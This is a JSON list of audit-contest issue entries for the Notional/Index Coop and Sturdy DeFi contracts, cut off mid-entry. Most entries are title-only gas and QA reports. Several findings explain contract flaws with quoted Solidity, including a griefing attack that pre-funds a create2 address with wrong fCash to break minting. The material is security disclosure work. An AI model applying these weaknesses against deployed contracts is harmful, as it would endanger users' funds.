[{"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/130", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/128", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/127", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/125", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/124", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/122", "labels": ["bug", "QA (Quality Assurance)", "Notional"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/121", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/120", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/119", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/118", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/117", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "fCash of the wrong maturity and asset can be sent to wrapper address before wrapper is deployed ", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/115", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "Notional"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashLogic.sol#L131   # Vulnerability details  ## Impact Minting becomes impossible   ## Proof of Concept onERC1155Received is only called when the size of the code deployed at the address contains code. Since create2 is used to deploy the contract, the address can be calculated before the contract is deployed. A malicious actor could send the address fCash of a different maturity or asset before the contract is deployed and since nothing has been deployed, onERC1155Received will not be called and the address will accept the fCash. After the contract is deployed and correct fCash is sent to the address, onERC1155Received will check the length of the assets held by the address and it will be more than 1 (fCash of correct asset and maturity and fCash with wrong maturity or asset sent before deployment). This will cause the contract to always revert essentially breaking the mint completely.   ## Tools Used  ## Recommended Mitigation Steps When the contract is created create a function that reads how many fCash assets are at the address and send them away if they aren't of the correct asset and maturity  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/114", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/113", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/112", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/111", "labels": ["bug", "G (Gas Optimization)", "Notional"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/109", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/107", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "INITIALIZER MODIFIER IS SUSCEPTIBLE TO REENTRANCY DURING INITIALIZATION", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/106", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-06-notional-coop-findings", "body": "INITIALIZER MODIFIER IS SUSCEPTIBLE TO REENTRANCY DURING INITIALIZATION"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/105", "labels": ["bug", "G (Gas Optimization)", "Notional"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/104", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/101", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/100", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "transferfCash does not work as expected", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/98", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "Notional"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/main/notional-wrapped-fcash/contracts/wfCashLogic.sol#L184   # Vulnerability details  ## Impact If maturity is reached and user has asked for redeem with opts.transferfCash as true, then if (hasMatured()) turns true at wfCashLogic.sol#L216 causing fcash to be cashed out in underlying token and then sent to receiver. So receiver obtains underlying when fcash was expected. The sender wont get an error thinking fcash transfer was success  ## Proof of Concept  1. User A calls redeem with opts.transferfCash as true and receiver as User B 2. Since maturity is reached so instead of transferring the fCash, contract would simply cash out fCash and sent the underlying token to the receiver which was not expected  ## Recommended Mitigation Steps If opts.transferfCash is true and maturity is reached then throw an error mentioning that fCash can no longer be transferred  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/96", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/95", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/94", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/93", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/92", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "The logic of _isUnderlying() in NotionalTradeModule is wrong which will cause mintFCashPosition() and redeemFCashPosition() revert on `fcash` tokens which asset token is underlying token (asset.tokenType == TokenType.NonMintable)", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/87", "labels": ["bug", "help wanted", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "Index"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L558-L575   # Vulnerability details  ## Impact For some `fcash` the asset token is underlying token (`asset.tokenType == TokenType.NonMintable`) and `NotionalV2` will not handle minting or burning when it is called with `useUnderlying==True` for those `fcash`s (according to what I asked from sponsor). In summery most of the logics in `NotionalTradeModule ` will not work for those `fcash` tokens because `_isUnderlying()` returns `true` result for those tokens which would make `NotionalTradeModule`'s logic for `mintFCashPosition()` and `redeemFCashPosition()` will eventually call `redeemToUnderlying()` and `mintViaUnderlying()` in `wfCashLogic` and those function in `wfCashLogic` will call `NotionalV2` with `useUnderlying==True` and `NotionalV2` will fail and revert for `fcash` tokens which asset token is underlying token, so the whole transaction will fail and `_mintFCashPosition()` and `_redeemFCashPosition()`  logic in `NotionalTradeModule ` will not work for those `fcash` tokens and manager can't add them to `set` protocol.   ## Proof of Concept when for some `fcash` asset token is underlying token, all calls to `NotionalV2` should be with `useUnderlying==False`. but `_isUnderlying()` in `NotionalTradeModule` contract first check that `isUnderlying = _paymentToken == underlyingToken` so for `fcash` tokens where asset token is underlying token it is going to return `isUnderlying==True`. let's assume that for some specific `fcash` asset token is underlying token (`asset.tokenType == TokenType.NonMintable`) and follow the code execution.  This is `_isUnderlying()` code in `NotionalTradeModule`: ```     function _isUnderlying(         IWrappedfCashComplete _fCashPosition,         IERC20 _paymentToken     )     internal     view     returns(bool isUnderlying)     {         (IERC20 underlyingToken, IERC20 assetToken) = _getUnderlyingAndAssetTokens(_fCashPosition);         isUnderlying = _paymentToken == underlyingToken;         if(!isUnderlying) {             require(_paymentToken == assetToken, \"Token is neither asset nor underlying token\");         }     } ``` As you can see it calls `_getUnderlyingAndAssetTokens()` and then check `_paymentToken == underlyingToken` to see that if payment token is equal to `underlyingToken`. `_getUnderlyingAndAssetTokens()` uses `getUnderlyingToken()` and `getAssetToken()` in `wfCashBase`. This is `getUnderlyingToken()` code in `wfCashBase`: ```     /// @notice Returns the token and precision of the token that this token settles     /// to. For example, fUSDC will return the USDC token address and 1e6. The zero     /// address will represent ETH.     function getUnderlyingToken() public view override returns (IERC20 underlyingToken, int256 underlyingPrecision) {         (Token memory asset, Token memory underlying) = NotionalV2.getCurrency(getCurrencyId());          if (asset.tokenType == TokenType.NonMintable) {             // In this case the asset token is the underlying             return (IERC20(asset.tokenAddress), asset.decimals);         } else {             return (IERC20(underlying.tokenAddress), underlying.decimals);         }     } ``` As you can see for our specific `fcash` token this function will return asset token as underlying token. so for this specific `fcash` token, the asset token and underlying token will be same in `_isUnderlying()` of `NationalTradeModule` but because code first check `isUnderlying = _paymentToken == underlyingToken` so the function will return `isUnderlying=True` as a result for our specific `fcash` token (which asset token is underlying token) This is `_mintFCashPosition()` and `_redeemFCashPosition()` code in `NotionalTradeModule `: ```     /**      * @dev Redeem a given fCash position from the specified send token (either underlying or asset token)      * @dev Alo adjust the components / position of the set token accordingly      */     function _mintFCashPosition(         ISetToken _setToken,         IWrappedfCashComplete _fCashPosition,         IERC20 _sendToken,         uint256 _fCashAmount,         uint256 _maxSendAmount     )     internal     returns(uint256 sentAmount)     {         if(_fCashAmount == 0) return 0;          bool fromUnderlying = _isUnderlying(_fCashPosition, _sendToken);           _approve(_setToken, _fCashPosition, _sendToken, _maxSendAmount);          uint256 preTradeSendTokenBalance = _sendToken.balanceOf(address(_setToken));         uint256 preTradeReceiveTokenBalance = _fCashPosition.balanceOf(address(_setToken));          _mint(_setToken, _fCashPosition, _maxSendAmount, _fCashAmount, fromUnderlying);           (sentAmount,) = _updateSetTokenPositions(             _setToken,             address(_sendToken),             preTradeSendTokenBalance,             address(_fCashPosition),             preTradeReceiveTokenBalance         );          require(sentAmount <= _maxSendAmount, \"Overspent\");         emit FCashMinted(_setToken, _fCashPosition, _sendToken, _fCashAmount, sentAmount);     }      /**      * @dev Redeem a given fCash position for the specified receive token (either underlying or asset token)      * @dev Alo adjust the components / position of the set token accordingly      */     function _redeemFCashPosition(         ISetToken _setToken,         IWrappedfCashComplete _fCashPosition,         IERC20 _receiveToken,         uint256 _fCashAmount,         uint256 _minReceiveAmount     )     internal     returns(uint256 receivedAmount)     {         if(_fCashAmount == 0) return 0;          bool toUnderlying = _isUnderlying(_fCashPosition, _receiveToken);         uint256 preTradeReceiveTokenBalance = _receiveToken.balanceOf(address(_setToken));         uint256 preTradeSendTokenBalance = _fCashPosition.balanceOf(address(_setToken));          _redeem(_setToken, _fCashPosition, _fCashAmount, toUnderlying);           (, receivedAmount) = _updateSetTokenPositions(             _setToken,             address(_fCashPosition),             preTradeSendTokenBalance,             address(_receiveToken),             preTradeReceiveTokenBalance         );           require(receivedAmount >= _minReceiveAmount, \"Not enough received amount\");         emit FCashRedeemed(_setToken, _fCashPosition, _receiveToken, _fCashAmount, receivedAmount);      } ``` As you can see they both uses `_isUnderlying()` to find out that if `_sendToken` is asset token or underlying token. for our specific `fcash` token, the result of `_isUnderlying()` will be `True` and `_mintFCashPosition()` and `_redeemFCashPosition()`  will call `_mint()` and `_redeem()` with `toUnderlying` set as `True`. This is `_mint()` and `_redeem()` code: ```     /**      * @dev Invokes the wrappedFCash token's mint function from the setToken      */     function _mint(         ISetToken _setToken,         IWrappedfCashComplete _fCashPosition,         uint256 _maxAssetAmount,         uint256 _fCashAmount,         bool _fromUnderlying     )     internal     {         uint32 minImpliedRate = 0;          bytes4 functionSelector =              _fromUnderlying ? _fCashPosition.mintViaUnderlying.selector : _fCashPosition.mintViaAsset.selector;         bytes memory mintCallData = abi.encodeWithSelector(             functionSelector,             _maxAssetAmount,             uint88(_fCashAmount),             address(_setToken),             minImpliedRate,             _fromUnderlying         );         _setToken.invoke(address(_fCashPosition), 0, mintCallData);     }      /**      * @dev Redeems the given amount of fCash token on behalf of the setToken      */     function _redeem(         ISetToken _setToken,         IWrappedfCashComplete _fCashPosition,         uint256 _fCashAmount,         bool _toUnderlying     )     internal     {         uint32 maxImpliedRate = type(uint32).max;          bytes4 functionSelector =             _toUnderlying ? _fCashPosition.redeemToUnderlying.selector : _fCashPosition.redeemToAsset.selector;         bytes memory redeemCallData = abi.encodeWithSelector(             functionSelector,             _fCashAmount,             address(_setToken),             maxImpliedRate         );         _setToken.invoke(address(_fCashPosition), 0, redeemCallData);     } ``` As you can see they are using `_toUnderlying` value to decide calling between (`mintViaUnderlying()` or `mintViaAsset()`) and (`redeemToUnderlying()` or `redeemToAsset()`), for our specific `fcash` `_toUnderlying` will be `True` so those functions will call `mintViaUnderlying()` and `redeemToUnderlying()` in `wfCashLogic`. `mintViaUnderlying()` and `redeemToUnderlying()` in `wfCashLogic` execution flow eventually would call `NotionalV2` functions with `useUnderlying=True` for this specific `fcash` token, but `NotionalV2` will revert for that call because for that `fcash` token asset token is underlying token and `NotionalV2` can't handle calls with `useUnderlying==True` for that `fcash` Token. This will cause all the transaction to fail and manager can't call `redeemFCashPosition()` or `mintFCashPosition()` functions for those `fcash` tokens that asset token is underlying token. In summery `NotionalTradeModule` logic will not work for all `fcash` tokens becasue the logic of `_isUnderlying()` is wrong for `fcash` tokens that asset token is underlying token.  ## Tools Used VIM  ## Recommended Mitigation Steps Change the logic of `_isUnderlying()` in `NotionalTradeModule` so it returns correct results for all `fcash` tokens. one simple solution can be that it first check `payment token`  value with `asset token` value.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/84", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/83", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "deposit() and mint() and _redeemInternal() in wfCashERC4626() will revert for all fcash that asset token is underlying token because they always call _mintInternal() with useUnderlying==True", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/82", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "Notional"], "target": "2022-06-notional-coop-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L177-L184 https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L168-L175 https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L225-L241   # Vulnerability details  ## Impact For some `fcash` the asset token is underlying token (`asset.tokenType == TokenType.NonMintable`) and `NotionalV2` will not handle minting with `useUnderlying==True` for those `fcash`s (according to what I asked from sponsor). In summery most of the logics in `wfCashERC4626` will not work for those `fcash` tokens.  when for some `fcash` asset token is underlying token, all calls to `NotionalV2` should be with `useUnderlying==False`. but `deposit()` and `mint()` in `wfCashERC4626` contract call `_mintInternal()` with `useUnderlying==True` and it calls `NotionalV2.batchLend()` with `depositUnderlying==true` so the `NotionV2` call will fail for `fcash` tokens that asset token is underlying token and it would cause  that `deposit()` and `mint()`  logic `wfCashERC4626`  will not work and contract will be useless for those tokens. `_redeemInternal()` issue is similar and it calls `_burn()` with `redeemToUnderlying: true` which execution eventually calls `NotionalV2.batchBalanceAndTradeAction()` with `toUnderlying=True` which will revert so `_redeemInternal()` will fail and because `withdraw()` and `redeem` use it, so they will not work too for those `fcash` tokens that asset token is underlying token.  ## Proof of Concept This is `deposit()` and `mint()`  code in `wfCashERC4626`: ```     /** @dev See {IERC4626-deposit} */     function deposit(uint256 assets, address receiver) public override returns (uint256) {         uint256 shares = previewDeposit(assets);         // Will revert if matured         _mintInternal(assets, _safeUint88(shares), receiver, 0, true);         emit Deposit(msg.sender, receiver, assets, shares);         return shares;     }      /** @dev See {IERC4626-mint} */     function mint(uint256 shares, address receiver) public override returns (uint256) {         uint256 assets = previewMint(shares);         // Will revert if matured         _mintInternal(assets, _safeUint88(shares), receiver, 0, true);         emit Deposit(msg.sender, receiver, assets, shares);         return assets;     } ``` As you can see they both call `_mintInternal()` with last parameter as `true` which is `useUnderlying`'s value. This is `_mintInternal()` code: ```     function _mintInternal(         uint256 depositAmountExternal,         uint88 fCashAmount,         address receiver,         uint32 minImpliedRate,         bool useUnderlying     ) internal nonReentrant {         require(!hasMatured(), \"fCash matured\");         (IERC20 token, bool isETH) = getToken(useUnderlying);         uint256 balanceBefore = isETH ? address(this).balance : token.balanceOf(address(this));          // If dealing in ETH, we use WETH in the wrapper instead of ETH. NotionalV2 uses         // ETH natively but due to pull payment requirements for batchLend, it does not support         // ETH. batchLend only supports ERC20 tokens like cETH or aETH. Since the wrapper is a compatibility         // layer, it will support WETH so integrators can deal solely in ERC20 tokens. Instead of using         // \"batchLend\" we will use \"batchBalanceActionWithTrades\". The difference is that \"batchLend\"         // is more gas efficient (does not require and additional redeem call to asset tokens). If using cETH         // then everything will proceed via batchLend.         if (isETH) {             IERC20((address(WETH))).safeTransferFrom(msg.sender, address(this), depositAmountExternal);             WETH.withdraw(depositAmountExternal);              BalanceActionWithTrades[] memory action = EncodeDecode.encodeLendETHTrade(                 getCurrencyId(),                 getMarketIndex(),                 depositAmountExternal,                 fCashAmount,                 minImpliedRate             );             // Notional will return any residual ETH as the native token. When we _sendTokensToReceiver those             // native ETH tokens will be wrapped back to WETH.             NotionalV2.batchBalanceAndTradeAction{value: depositAmountExternal}(address(this), action);         } else {             // Transfers tokens in for lending, Notional will transfer from this contract.             token.safeTransferFrom(msg.sender, address(this), depositAmountExternal);              // Executes a lending action on Notional             BatchLend[] memory action = EncodeDecode.encodeLendTrade(                 getCurrencyId(),                 getMarketIndex(),                 fCashAmount,                 minImpliedRate,                 useUnderlying             );             NotionalV2.batchLend(address(this), action);         }          // Mints ERC20 tokens for the receiver, the false flag denotes that we will not do an         // operatorAck         _mint(receiver, fCashAmount, \"\", \"\", false);          _sendTokensToReceiver(token, msg.sender, isETH, balanceBefore);     } ``` As you can see it calls `NotionalV2` functions with `useUnderlying=True` but according to sponsor clarification `NotionalV2` would fail and revert for those calls because `useUnderlying=True` and `fcash`'s asset token is underlying token (`asset.tokenType == TokenType.NonMintable`). So in summery for `fcash` tokens which asset token is underlying token `NotionalV2` won't handle calls which include `useUnderlying==True` but in `wfCashERC4626` contract functions like `deposit()`, `mint()`, `withdraw()` and `redeem()` they all uses `useUnderlying==True` always so `wfCashERC4626` won't work for those specific type of tokens which asset token is underlying token(`asset.tokenType == TokenType.NonMintable`)  the detail explanations for functions `withdraw()` and `redeem()` are similar.  ## Tools Used VIM  ## Recommended Mitigation Steps check that if for that `fcash` token asset token  is underlying token or not and set `useUnderlying` based on that.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/81", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "Functions convertToShares() and convertToAssets() don't consider hasMatured() state when totalSupply()==0", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/80", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "Functions convertToShares() and convertToAssets() don't consider hasMatured() state when totalSupply()==0"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/73", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/72", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/71", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/70", "labels": ["bug", "G (Gas Optimization)", "Notional"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/69", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/64", "labels": ["bug", "G (Gas Optimization)", "Index"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/63", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/55", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/50", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/49", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/48", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Must approve 0 first", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/44", "labels": ["bug", "QA (Quality Assurance)", "Index"], "target": "2022-06-notional-coop-findings", "body": "Must approve 0 first"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/41", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/40", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/39", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/29", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/28", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/27", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/26", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/25", "labels": ["bug", "G (Gas Optimization)", "Index"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/16", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/10", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-notional-coop-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/9", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/7", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/2", "labels": ["bug", "G (Gas Optimization)", "Notional"], "target": "2022-06-notional-coop-findings", "body": "Gas Optimizations"}, {"title": "Agreement & Disclosures", "html_url": "https://github.com/code-423n4/2022-06-notional-coop-findings/issues/1", "labels": [], "target": "2022-06-notional-coop-findings", "body": "Agreement & Disclosures"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/175", "labels": [], "target": "2022-05-sturdy-findings", "body": "Agreements & Disclosures"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/166", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/163", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/162", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/160", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/159", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/158", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "The check for value transfer success is made after the return statement in  _withdrawFromYieldPool of LidoVault", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/157", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-sturdy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L142   # Vulnerability details  ## Impact Users can lose their funds  ## Proof of Concept https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L142  The code checks transaction success after returning the transfer value and finishing execution. If the call fails the transaction won't revert since  require(sent, Errors.VT_COLLATERAL_WITHDRAW_INVALID); won't execute.  Users will have withdrawed without getting their funds back.   ## Recommended Mitigation Steps Return the function after the success check  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/155", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/150", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/149", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": 